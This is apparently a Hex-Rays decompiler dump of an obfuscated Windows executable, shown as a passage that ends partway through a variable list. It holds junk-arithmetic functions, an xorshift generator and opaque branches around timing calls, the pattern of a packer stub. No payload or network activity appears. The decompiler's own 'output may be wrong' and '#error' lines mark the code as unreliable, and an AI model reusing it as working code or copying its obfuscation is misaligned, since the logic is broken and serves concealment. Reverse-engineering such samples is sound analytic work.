/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall sub_4012DD@<eax>(int a1@<eax>);
// int __usercall sub_40167E@<eax>(int a1@<eax>);
// int __usercall sub_4017B1@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_40186E@<eax>(int a1@<eax>);
// int __usercall sub_401E03@<eax>(int a1@<eax>);
// int __usercall sub_4021EC@<eax>(int a1@<ebx>);
// int __usercall sub_4023DF@<eax>(int a1@<eax>);
// int __usercall sub_402790@<eax>(int a1@<eax>);
// int __usercall sub_402B51@<eax>(int *a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, __int128 a4);
// int __usercall sub_402B9D@<eax>(int a1@<eax>);
// int __usercall sub_402EB3@<eax>(int a1@<eax>);
// int __usercall sub_4030F0@<eax>(int a1@<eax>);
_DWORD start(); // weak
// int __usercall sub_403350@<eax>(int a1@<eax>);
// int __usercall sub_403374@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_403599@<eax>(int a1@<eax>);
// int __usercall sub_403867@<eax>(int a1@<eax>);
// int __usercall sub_403873@<eax>(int a1@<eax>);
// unsigned int __usercall sub_403BE6@<eax>(int a1@<edx>, int a2@<ebx>, int a3@<esi>);
// int __usercall sub_403D1D@<eax>(int a1@<eax>);
// int __usercall sub_403EE4@<eax>(int a1@<eax>);
// int __usercall sub_40447B@<eax>(int a1@<eax>);
int __cdecl sub_4044A1(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
// int __usercall sub_404C2A@<eax>(int a1@<eax>);
// int __usercall sub_404D6C@<eax>(int a1@<ebp>);
// int __usercall sub_404F59@<eax>(int a1@<eax>);
// int __usercall sub_4053F6@<eax>(int a1@<eax>);
// int __usercall sub_405418@<eax>(int a1@<eax>, __int128 a2);
int sub_405A1A();
// int __usercall sub_405ECA@<eax>(int a1@<eax>);
// int __usercall sub_405F1A@<eax>(int a1@<eax>, int a2@<ebp>);
// int __usercall sub_4062AA@<eax>(int a1@<eax>);
// int __usercall sub_40635B@<eax>(int a1@<eax>);
// int __usercall sub_406461@<eax>(int a1@<eax>);
// int __usercall sub_4065D6@<eax>(int a1@<eax>);
int sub_40687B();
// int __usercall sub_406D2F@<eax>(int a1@<eax>, int a2@<ebp>);
int sub_4074DE();
// char __usercall sub_407529@<al>(_DWORD *a1@<ebp>);
// int __usercall sub_407A0F@<eax>(int a1@<eax>);
unsigned int __cdecl sub_408299(_BYTE *a1);
// void __usercall sub_4085A0(int a1@<ebx>, int a2@<esi>);
// int __usercall sub_408832@<eax>(_DWORD *a1@<ebp>);
_BYTE *__cdecl sub_408EE3(_BYTE *a1, _BYTE *a2);
char sub_4090C4();
// void __usercall sub_409142(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
// void __usercall sub_409469(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_4095A7@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// UINT __stdcall GetACP();
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetCurrentProcessId();
// DWORD __stdcall GetCurrentThreadId();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// UINT __stdcall GetOEMCP();
// DWORD __stdcall GetPrivateProfileSectionA(LPCSTR lpAppName, LPSTR lpReturnedString, DWORD nSize, LPCSTR lpFileName);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_421119; // weak
_UNKNOWN unk_421219; // weak
int dword_43E004 = 0; // weak
int dword_43E008 = 0; // weak
int dword_43E00C = 0; // weak
int dword_43E010 = 0; // weak
int dword_43E014 = 0; // weak
int dword_43E018 = 0; // weak
int dword_43E01C = 0; // weak
int dword_43E020 = 0; // weak
int dword_43E024 = 0; // weak
int dword_43E028 = 0; // weak
int dword_43E02C = 0; // weak
int dword_43E030 = 0; // weak
int dword_43E034 = 0; // weak
int dword_43E038 = 0; // weak
int dword_43E03C = 0; // weak
int dword_43E040 = 0; // weak
int dword_43E044 = 0; // weak
int dword_43E048 = 0; // weak
int dword_43E04C = 0; // weak
int dword_43E10C = 0; // weak
int dword_43E160 = 0; // weak
int dword_43E164 = 0; // weak
int dword_43E2A8 = 0; // weak
int dword_43E47C = 0; // weak
int dword_43E4B4 = 0; // weak
char byte_43E528 = '\0'; // weak
int dword_43E654 = 651395328; // weak
int dword_43EA34 = 83951683; // weak
char byte_43EB30 = 'é'; // weak
int dword_43EB6C = 1355252693; // weak
char byte_43EC24 = '-'; // weak
int dword_43EC28 = -473865728; // weak
int dword_43ECD0 = 887682117; // weak
int dword_43ED94 = -2097051196; // weak
char byte_43EDF8 = '\0'; // weak
_UNKNOWN byte_43EE84; // weak
char byte_43EEA4 = '\0'; // weak
int dword_43EF48 = -373115121; // weak
int dword_43EF78 = -123082492; // weak
int dword_43F060 = 5968384; // weak
int dword_43F084 = 2055926401; // weak
int dword_43F0D8 = -2130689044; // weak
int dword_43F1C0 = -95537781; // weak
char byte_43F234 = 'd'; // weak
int *off_43F40C = &dword_43E038; // weak
_UNKNOWN dword_43F418; // weak
int dword_43F448 = 1138996237; // weak
int dword_43F45C = 1278577088; // weak
int dword_43F4C4 = -1868306176; // weak
int dword_43F634 = 987264024; // weak
int dword_43F66C = -135337601; // weak
int dword_43F6B0 = -1989922305; // weak
_UNKNOWN byte_43F7F4; // weak
int dword_43F904 = -1593835501; // weak
int dword_43F9E0 = 5002458; // weak
int dword_43FA12 = 521288629; // weak
int (__stdcall *dword_43FA26)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43FA32)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43FA56; // weak
int (__fastcall *dword_43FB55)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43FB88 = 48462; // weak
int (__thiscall *dword_43FB8C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43FB9C)(_DWORD, _DWORD) = NULL; // weak
int dword_43FBA4 = 0; // weak
int dword_43FBA8 = 88675123; // weak
int dword_43FBB4 = 362436069; // weak
int (__fastcall *dword_43FBC4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43FC08; // weak
_UNKNOWN dword_43FC0E; // weak
int (__fastcall *dword_43FC12)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43FC1E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43FC3A = -327219630; // weak
int dword_43FC3E = 0; // weak
int (__stdcall *dword_43FC42)(_DWORD, _DWORD) = NULL; // weak


//----- (004012DD) --------------------------------------------------------
int __usercall sub_4012DD@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 78 < 29 )
    result = 284;
  else
    result = 0;
  return result;
}
// 403B62: conditional instruction was optimized away because of '%0xC.4==81'
// 4043FF: conditional instruction was optimized away because of 'edx.4==45'
// 40440B: conditional instruction was optimized away because of '%0x14.4==45'

//----- (0040167E) --------------------------------------------------------
int __usercall sub_40167E@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  return sub_405F1A(a1, (int)&savedregs);
}

//----- (004017B1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_4017B1@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 28) = 149;
  *(_DWORD *)(a2 - 16) = 149;
  *(_DWORD *)(a2 - 24) = 118;
  *(_DWORD *)(a2 - 12) = 130;
  *(_DWORD *)(a2 - 8) = 36;
  *(_DWORD *)(a2 - 20) = 117;
  *(_DWORD *)(a2 - 4) = a1 % 149;
  if ( a1 % 149 >= 0 )
    return 174;
  if ( *(_DWORD *)(a2 - 24) != *(_DWORD *)(a2 - 28) )
    sub_403EE4(*(_DWORD *)(a2 - 12));
  return 476;
}
// 4026DC: positive sp value 4 has been found

//----- (0040186E) --------------------------------------------------------
int __usercall sub_40186E@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 195 < 21 )
    result = 131;
  else
    result = 72;
  return result;
}
// 406A10: conditional instruction was optimized away because of '%0x14.4==AF'

//----- (00401E03) --------------------------------------------------------
int __usercall sub_401E03@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 86 < 26 )
    result = 212;
  else
    result = 105;
  return result;
}

//----- (004021EC) --------------------------------------------------------
int __usercall sub_4021EC@<eax>(int a1@<ebx>)
{
  int result; // eax
  unsigned int v2; // eax
  int v3; // edx

  dword_43E038 += a1;
  v2 = dword_43FB88 ^ (dword_43FB88 << 11);
  dword_43E04C = 46423;
  LOBYTE(dword_43E034) = -98;
  dword_43FB88 = dword_43FBB4;
  dword_43FBB4 = dword_43FA12;
  v3 = dword_43FBA8;
  dword_43FA12 = dword_43FBA8;
  dword_43E010 = 532;
  LOBYTE(dword_43E02C) = dword_43E02C - 41;
  dword_43FBA8 ^= (v2 >> 8) ^ v2 ^ ((unsigned int)dword_43FBA8 >> 19);
  dword_43E004 += v3;
  result = dword_43FBA8;
  dword_43E048 = v3;
  dword_43E01C = v3;
  return result;
}
// 43E004: using guessed type int dword_43E004;
// 43E010: using guessed type int dword_43E010;
// 43E01C: using guessed type int dword_43E01C;
// 43E02C: using guessed type int dword_43E02C;
// 43E034: using guessed type int dword_43E034;
// 43E038: using guessed type int dword_43E038;
// 43E048: using guessed type int dword_43E048;
// 43E04C: using guessed type int dword_43E04C;
// 43FA12: using guessed type int dword_43FA12;
// 43FB88: using guessed type int dword_43FB88;
// 43FBA8: using guessed type int dword_43FBA8;
// 43FBB4: using guessed type int dword_43FBB4;

//----- (004023DF) --------------------------------------------------------
int __usercall sub_4023DF@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  return sub_406D2F(a1, (int)&savedregs);
}

//----- (00402790) --------------------------------------------------------
int __usercall sub_402790@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 219;
  v2 = a1 / 219;
  if ( v3 >= 32 )
    return 108;
  sub_403867(v2);
  return 255;
}
// 40341A: conditional instruction was optimized away because of '%var_4.4==F3'

//----- (00402B51) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall sub_402B51@<eax>(int *a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, __int128 a4)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // edx
  __int16 v7; // cx
  unsigned int v8; // ecx
  BOOL v9; // eax
  int v10; // edx
  int v11; // ecx
  int v12; // edx
  int v13; // eax
  int *v14; // ecx
  int result; // eax
  int v16; // ecx
  unsigned int v17; // ecx
  unsigned int v18; // edx
  unsigned int v19; // eax
  int v20; // [esp+39h] [ebp-3A7h]
  int v21; // [esp+E4h] [ebp-2FCh]
  int v22; // [esp+ECh] [ebp-2F4h]
  int v23; // [esp+118h] [ebp-2C8h]
  int v24; // [esp+160h] [ebp-280h] BYREF
  __int16 v25; // [esp+168h] [ebp-278h]
  _DWORD v26[2]; // [esp+16Ch] [ebp-274h]
  int v27; // [esp+174h] [ebp-26Ch]
  int v28; // [esp+1A4h] [ebp-23Ch]
  int v29; // [esp+1C4h] [ebp-21Ch]
  int v30; // [esp+1D4h] [ebp-20Ch]
  int v31; // [esp+1DCh] [ebp-204h]
  char v32; // [esp+1F8h] [ebp-1E8h]
  int v33; // [esp+21Ch] [ebp-1C4h]
  char v34; // [esp+228h] [ebp-1B8h] BYREF
  char v35; // [esp+238h] [ebp-1A8h]
  _DWORD v36[12]; // [esp+24Ch] [ebp-194h] BYREF
  int v37; // [esp+298h] [ebp-148h]
  int v38; // [esp+2CCh] [ebp-114h]
  __int16 v39; // [esp+2E0h] [ebp-100h]
  int v40; // [esp+2ECh] [ebp-F4h]
  LARGE_INTEGER PerformanceCount; // [esp+304h] [ebp-DCh] BYREF
  int v42; // [esp+318h] [ebp-C8h]
  char v43; // [esp+334h] [ebp-ACh]
  char v44; // [esp+360h] [ebp-80h]
  int v45; // [esp+384h] [ebp-5Ch]
  int v46; // [esp+3ACh] [ebp-34h]
  char v47; // [esp+3CCh] [ebp-14h]
  char v48; // [esp+3D0h] [ebp-10h]
  int savedregs; // [esp+3E0h] [ebp+0h] BYREF
  void *retaddr; // [esp+3E4h] [ebp+4h] OVERLAPPED

  v39 ^= 0x43u;
  if ( a1 != (int *)960 )
  {
    a1 = &savedregs;
    a3 |= *(unsigned int *)((char *)&retaddr + 3);
    a2 ^= *(_DWORD *)((char *)&a4 + 5);
    v43 ^= 0x1Eu;
  }
  v7 = a3 - 11294 + (a3 < 0x2C1E) + a3 - 11294;
  if ( (int *)a2 != a1 )
    goto LABEL_28;
  LOBYTE(v45) = v45 + 39;
  v5 = (((_WORD)v29 + v7) & 0x2202) - (_DWORD)retaddr;
  if ( v5 )
    goto LABEL_21;
  v32 += 39;
  v8 = -v21;
  v38 -= v21;
  if ( v8 == 624 )
  {
    v27 += 624;
    v33 -= 624;
LABEL_28:
    v29 -= 40;
    v8 = *(_DWORD *)((char *)&a4 + 3) ^ (unsigned int)&v34;
  }
  v5 = v36[0] + v8;
  v37 += (int)v36;
  v33 -= 255;
LABEL_21:
  v26[0] ^= v5;
  v9 = QueryPerformanceCounter(&PerformanceCount);
  v12 = v46 + v10;
  v45 |= v9;
  v13 = v42 | v9;
  v14 = (int *)(v23 | v11);
  if ( v12 )
  {
    v14 = &v24;
    v12 += *(_DWORD *)((char *)v26 + 2);
    v48 |= 0x86u;
    v13 = (unsigned __int16)v28 & (unsigned __int16)(v25 ^ v13) & 0x2695;
  }
  v4 = (int)v14 - 7574;
  v44 |= 0x39u;
  if ( v24 != v12 )
  {
    v31 ^= 0x20u;
    v4 += v13;
  }
  if ( v13 )
    goto LABEL_17;
  v16 = *(_DWORD *)((char *)&a4 + 3) + (*(_DWORD *)((char *)&a4 + 5) | v4);
  if ( &savedregs == (int *)v16 )
    goto LABEL_17;
  v17 = (*(_DWORD *)((_BYTE *)&a4 + 2) & v16) - *(_DWORD *)((char *)&retaddr + 2) - (_DWORD)&savedregs;
  if ( v17 == 90 )
    goto LABEL_17;
  v18 = *(_DWORD *)((char *)&a4 + 1) ^ (v20
                                      + ((*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB) < v17)
                                      + (*(_DWORD *)((char *)&a4 + 6) | (unsigned int)&savedregs | 0x24BB));
  v19 = v18 & (*(_DWORD *)((char *)&a4 + 6) ^ (unsigned int)&savedregs);
  v45 ^= v19;
  if ( v19 != 621 )
  {
    v6 = v30 | v22 | (v18 + 15172);
    if ( v6 == v19 )
    {
LABEL_17:
      v35 &= 0xE4u;
      goto LABEL_18;
    }
    v47 |= 0xD3u;
    if ( v19 )
    {
      LOWORD(v31) = v31 & 0xCE;
      goto LABEL_17;
    }
  }
LABEL_18:
  result = 0;
  v40 &= 0x3Cu;
  return result;
}
// 402B51: variables would overlap: ^3E8.4(retaddr) and ^3EA.4,^3EB.4

//----- (00402B9D) --------------------------------------------------------
int __usercall sub_402B9D@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 62 < 29 )
    result = 6;
  else
    result = 198;
  return result;
}
// 403060: conditional instruction was optimized away because of '%var_1C.4==18'
// 403B27: conditional instruction was optimized away because of '%var_2C.4==99'
// 4057A1: conditional instruction was optimized away because of '%var_4.4==FA'

//----- (00402EB3) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_402EB3@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_403374(a1, (int)&savedregs);
}
// 402EB6: bad sp value at call

//----- (004030F0) --------------------------------------------------------
int __usercall sub_4030F0@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 195;
  v1 = a1 / 195;
  if ( v2 >= 11 )
    return 13;
  sub_406461(v1);
  return 402;
}
// 402E4C: conditional instruction was optimized away because of 'ebx.4==8A'
// 4033A0: conditional instruction was optimized away because of '%var_18.4==11'
// 4033A6: conditional instruction was optimized away because of '%var_18.4==11'

//----- (0040318A) --------------------------------------------------------
#error "4063EC: call analysis failed (funcsize=201)"

//----- (00403350) --------------------------------------------------------
int __usercall sub_403350@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 130 < 17 )
    result = 980;
  else
    result = 61;
  return result;
}

//----- (00403374) --------------------------------------------------------
int __usercall sub_403374@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int result; // eax

  *(_DWORD *)(a2 - 20) = 177;
  *(_DWORD *)(a2 - 8) = 82;
  *(_DWORD *)(a2 - 12) = 30;
  *(_DWORD *)(a2 - 16) = 191;
  *(_DWORD *)(a2 - 4) = a1 % 82;
  if ( a1 % 82 < 17 )
    result = 210;
  else
    result = 30;
  return result;
}

//----- (00403599) --------------------------------------------------------
int __usercall sub_403599@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // eax
  int v4; // et2

  v4 = a1 % 174;
  v3 = a1 / 174;
  if ( v4 >= 25 )
    return 77;
  v2 = sub_406461(v3);
  sub_402790(v2);
  return 708;
}
// 4031E5: conditional instruction was optimized away because of '%0x20.4==1E'
// 40634D: conditional instruction was optimized away because of '%0x2C.4==53'

//----- (00403867) --------------------------------------------------------
int __usercall sub_403867@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 48;
  v2 = a1 / 48;
  if ( v3 >= 13 )
    return 111;
  sub_402EB3(v2);
  return 321;
}
// 402348: conditional instruction was optimized away because of '%var_14.4==36'
// 40321A: conditional instruction was optimized away because of '%var_10.4==90'
// 403220: conditional instruction was optimized away because of '%var_10.4==90'
// 403C72: conditional instruction was optimized away because of '%var_C.4==7A'
// 4039E1: conditional instruction was optimized away because of '%var_10.4==90'

//----- (00403873) --------------------------------------------------------
int __usercall sub_403873@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 130 < 17 )
    result = 959;
  else
    result = 72;
  return result;
}
// 405C16: conditional instruction was optimized away because of 'ecx.4==82'

//----- (00403BE6) --------------------------------------------------------
unsigned int __usercall sub_403BE6@<eax>(int a1@<edx>, int a2@<ebx>, int a3@<esi>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_43E048 = a2;
  dword_43E00C += a3;
  dword_43FC3A ^= a1 + 1397;
  dword_43E014 += dword_43EF78;
  result = retaddr & 0xFFFF0000;
  dword_43FC3E = retaddr & 0xFFFF0000;
  dword_43E044 = dword_43EF78;
  return result;
}
// 43E00C: using guessed type int dword_43E00C;
// 43E014: using guessed type int dword_43E014;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43EF78: using guessed type int dword_43EF78;
// 43FC3A: using guessed type int dword_43FC3A;
// 43FC3E: using guessed type int dword_43FC3E;

//----- (00403D1D) --------------------------------------------------------
int __usercall sub_403D1D@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 188 < 7 )
    result = 684;
  else
    result = 17;
  return result;
}
// 40488D: conditional instruction was optimized away because of '%var_1C.4==BC'
// 405499: conditional instruction was optimized away because of '%var_1C.4==BC'

//----- (00403EE4) --------------------------------------------------------
int __usercall sub_403EE4@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  return sub_4017B1(a1, (int)&savedregs);
}

//----- (0040447B) --------------------------------------------------------
int __usercall sub_40447B@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 76;
  v1 = a1 / 76;
  if ( v2 >= 3 )
    return 153;
  sub_406461(v1);
  return 221;
}
// 4040DA: conditional instruction was optimized away because of '%var_10.4==64'
// 4045B6: conditional instruction was optimized away because of '%var_4.4==64'
// 4045BC: conditional instruction was optimized away because of '%var_4.4==64'
// 4045C3: conditional instruction was optimized away because of '%var_4.4==64'

//----- (004044A1) --------------------------------------------------------
#error "4044A8: call analysis failed (funcsize=23)"

//----- (00404C2A) --------------------------------------------------------
int __usercall sub_404C2A@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 88;
  v1 = a1 / 88;
  if ( v2 >= 22 )
    return 159;
  sub_403599(v1);
  return 790;
}
// 40117A: conditional instruction was optimized away because of '%var_10.4==35'
// 401180: conditional instruction was optimized away because of '%var_10.4==35'
// 401187: conditional instruction was optimized away because of '%var_10.4==35'
// 403FE6: conditional instruction was optimized away because of '%var_10.4==35'

//----- (00404D6C) --------------------------------------------------------
int __usercall sub_404D6C@<eax>(int a1@<ebp>)
{
  int v1; // eax

  *(_DWORD *)(a1 - 4) = 189;
  *(_DWORD *)(a1 - 8) = 200;
  sub_406461(52);
  v1 = dword_43FB88 ^ (dword_43FB88 << 11);
  *(_DWORD *)(a1 - 12) = v1;
  dword_43FB88 = dword_43FBB4;
  dword_43FBB4 = dword_43FA12;
  sub_406461(v1);
  dword_43FA12 = dword_43FBA8;
  dword_43FBA8 ^= (*(_DWORD *)(a1 - 12) >> 8) ^ *(_DWORD *)(a1 - 12) ^ ((unsigned int)dword_43FBA8 >> 19);
  return dword_43FBA8;
}
// 43FA12: using guessed type int dword_43FA12;
// 43FB88: using guessed type int dword_43FB88;
// 43FBA8: using guessed type int dword_43FBA8;
// 43FBB4: using guessed type int dword_43FBB4;

//----- (00404F59) --------------------------------------------------------
int __usercall sub_404F59@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 90 < 0 )
    result = 336;
  else
    result = 69;
  return result;
}
// 401355: conditional instruction was optimized away because of '%var_54.4==28'
// 405B9D: conditional instruction was optimized away because of '%var_C.4==D7'

//----- (004053F6) --------------------------------------------------------
int __usercall sub_4053F6@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 174 < 0 )
    result = 403;
  else
    result = 110;
  return result;
}
// 40379D: conditional instruction was optimized away because of 'ebx.4==2F'
// 4037A4: conditional instruction was optimized away because of 'ebx.4==2F'
// 404091: conditional instruction was optimized away because of '%var_14.4==47'
// 404097: conditional instruction was optimized away because of '%var_14.4==47'
// 40409E: conditional instruction was optimized away because of '%var_14.4==47'

//----- (00405418) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __usercall sub_405418@<eax>(int a1@<eax>, __int128 a2)
{
  unsigned int v2; // eax
  int v3; // ecx
  unsigned int v4; // eax
  int v5; // edx
  int v6; // eax
  int v7; // eax
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int v10; // edx
  int v11; // edx
  int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  __int16 v15; // ax
  char *v16; // eax
  unsigned int v17; // edx
  int v18; // ecx
  unsigned int v19; // edx
  int v20; // ecx
  unsigned int v21; // ecx
  int v22; // ecx
  unsigned int v23; // edx
  int v24; // eax
  int v25; // edx
  int v26; // ecx
  int v27; // ecx
  unsigned int v28; // eax
  int v29; // ecx
  int v30; // edx
  unsigned int v31; // ecx
  int v32; // edx
  int v33; // edx
  int v34; // eax
  int v35; // edx
  int v36; // ecx
  __int16 v37; // ax
  int v38; // edx
  unsigned int v39; // ecx
  unsigned int v40; // ecx
  BOOL v41; // eax
  int v42; // edx
  int v43; // eax
  unsigned int v44; // ecx
  int v45; // ecx
  int v46; // ecx
  unsigned int v47; // edx
  int v48; // edx
  int *v49; // eax
  int v50; // edx
  int v51; // ecx
  unsigned int v52; // ecx
  unsigned int v53; // eax
  int v54; // ecx
  bool v55; // cf
  int v56; // edx
  int v57; // ecx
  int v58; // edx
  unsigned int v59; // ecx
  int v60; // eax
  unsigned int v61; // eax
  unsigned int v62; // edx
  int v63; // ecx
  unsigned int v64; // eax
  int v65; // ecx
  int v66; // edx
  int v67; // ecx
  int v68; // eax
  unsigned int v69; // ecx
  int v70; // eax
  int v71; // edx
  int v72; // eax
  unsigned int v73; // edx
  int result; // eax
  unsigned int v75; // kr00_4
  int v76; // ecx
  int v77; // edx
  unsigned int v78; // ecx
  int *v79; // eax
  __int64 v80; // [esp-31Ch] [ebp-320h] BYREF
  int v81; // [esp-314h] [ebp-318h]
  int v82; // [esp-310h] [ebp-314h]
  char v83; // [esp-30Ch] [ebp-310h] BYREF
  int v84; // [esp-304h] [ebp-308h]
  int v85; // [esp-2F8h] [ebp-2FCh]
  char v86; // [esp-2E8h] [ebp-2ECh]
  int v87; // [esp-2E4h] [ebp-2E8h]
  char v88; // [esp-2DCh] [ebp-2E0h]
  _TBYTE *v89; // [esp-2D4h] [ebp-2D8h]
  int v90; // [esp-2CCh] [ebp-2D0h] BYREF
  _BYTE v91[6]; // [esp-2C8h] [ebp-2CCh] BYREF
  _BYTE v92[6]; // [esp-2C2h] [ebp-2C6h]
  _BYTE v93[6]; // [esp-2BCh] [ebp-2C0h]
  _BYTE v94[6]; // [esp-2B6h] [ebp-2BAh]
  _WORD v95[2]; // [esp-2ACh] [ebp-2B0h] BYREF
  __int64 v96; // [esp-2A8h] [ebp-2ACh]
  int v97; // [esp-2A0h] [ebp-2A4h]
  char v98; // [esp-29Ch] [ebp-2A0h]
  int v99; // [esp-298h] [ebp-29Ch] BYREF
  int v100; // [esp-290h] [ebp-294h]
  _TBYTE v101; // [esp-28Ah] [ebp-28Eh] BYREF
  int v102; // [esp-279h] [ebp-27Dh]
  int v103; // [esp-274h] [ebp-278h]
  char v104; // [esp-26Ch] [ebp-270h]
  _BYTE v105[11]; // [esp-268h] [ebp-26Ch] BYREF
  int v106; // [esp-25Dh] [ebp-261h] BYREF
  int v107; // [esp-258h] [ebp-25Ch]
  int v108; // [esp-24Ch] [ebp-250h]
  int v109; // [esp-248h] [ebp-24Ch]
  __int16 v110; // [esp-244h] [ebp-248h]
  int v111; // [esp-240h] [ebp-244h]
  __int16 v112; // [esp-23Ch] [ebp-240h]
  __int16 v113; // [esp-238h] [ebp-23Ch]
  int v114; // [esp-230h] [ebp-234h] BYREF
  int v115; // [esp-22Ch] [ebp-230h] BYREF
  _BYTE v116[6]; // [esp-224h] [ebp-228h]
  int v117; // [esp-21Ch] [ebp-220h] BYREF
  int v118; // [esp-218h] [ebp-21Ch]
  __int16 v119; // [esp-214h] [ebp-218h]
  int v120; // [esp-212h] [ebp-216h]
  _DWORD v121[2]; // [esp-20Ch] [ebp-210h] BYREF
  _BYTE v122[12]; // [esp-204h] [ebp-208h]
  char v123; // [esp-1F4h] [ebp-1F8h]
  int v124; // [esp-1F0h] [ebp-1F4h]
  int v125; // [esp-1E4h] [ebp-1E8h]
  int v126; // [esp-1E0h] [ebp-1E4h]
  int v127; // [esp-1D8h] [ebp-1DCh]
  int v128; // [esp-1D4h] [ebp-1D8h]
  int v129; // [esp-1D0h] [ebp-1D4h] BYREF
  _BYTE v130[6]; // [esp-1C4h] [ebp-1C8h]
  int v131; // [esp-1BCh] [ebp-1C0h]
  int v132; // [esp-1B8h] [ebp-1BCh]
  __int16 v133; // [esp-1A8h] [ebp-1ACh]
  int v134; // [esp-194h] [ebp-198h]
  int v135; // [esp-190h] [ebp-194h]
  int v136; // [esp-180h] [ebp-184h]
  _BYTE v137[6]; // [esp-17Ah] [ebp-17Eh]
  int v138; // [esp-174h] [ebp-178h]
  int v139; // [esp-16Ch] [ebp-170h]
  _BYTE v140[16]; // [esp-164h] [ebp-168h] BYREF
  int v141; // [esp-154h] [ebp-158h]
  int v142; // [esp-140h] [ebp-144h]
  int v143; // [esp-134h] [ebp-138h]
  int v144; // [esp-12Ch] [ebp-130h]
  char v145; // [esp-128h] [ebp-12Ch]
  int v146; // [esp-124h] [ebp-128h]
  __int64 v147; // [esp-118h] [ebp-11Ch]
  int v148; // [esp-110h] [ebp-114h]
  int v149; // [esp-108h] [ebp-10Ch]
  int v150; // [esp-104h] [ebp-108h]
  LARGE_INTEGER v151; // [esp-100h] [ebp-104h] BYREF
  __int16 v152; // [esp-E8h] [ebp-ECh]
  int v153; // [esp-DCh] [ebp-E0h]
  LARGE_INTEGER v154; // [esp-D0h] [ebp-D4h] BYREF
  int v155; // [esp-C8h] [ebp-CCh]
  _BYTE v156[7]; // [esp-C0h] [ebp-C4h] BYREF
  __int16 v157; // [esp-B8h] [ebp-BCh]
  int v158; // [esp-B4h] [ebp-B8h]
  _BYTE v159[6]; // [esp-AEh] [ebp-B2h]
  int v160; // [esp-A0h] [ebp-A4h]
  int v161; // [esp-98h] [ebp-9Ch]
  int v162; // [esp-90h] [ebp-94h]
  int v163; // [esp-8Ch] [ebp-90h]
  __int16 v164; // [esp-80h] [ebp-84h] BYREF
  int v165; // [esp-78h] [ebp-7Ch]
  int v166; // [esp-70h] [ebp-74h]
  __int16 v167; // [esp-6Ch] [ebp-70h]
